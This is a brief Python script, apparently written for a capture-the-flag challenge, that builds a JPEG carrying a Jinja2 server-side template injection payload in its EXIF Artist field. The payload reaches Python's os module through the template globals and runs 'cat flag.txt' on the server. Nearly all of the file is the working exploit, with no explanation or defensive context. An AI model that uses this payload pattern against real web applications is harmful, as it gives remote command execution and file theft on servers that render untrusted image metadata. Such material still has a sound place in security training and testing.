from PIL import Image
import piexif

# Create a simple image
img = Image.new('RGB', (100, 100), color='red')

# Define EXIF data with malicious payload in the "Artist" field
exif_dict = {
    "0th": {
        0x013B: b'{{ request.application.__globals__.__builtins__.__import__("os").popen("cat flag.txt").read() }}',
    }
}

# Convert EXIF dictionary to bytes
exif_bytes = piexif.dump(exif_dict)

# Save the image with EXIF data
img.save("exploit.jpg", exif=exif_bytes)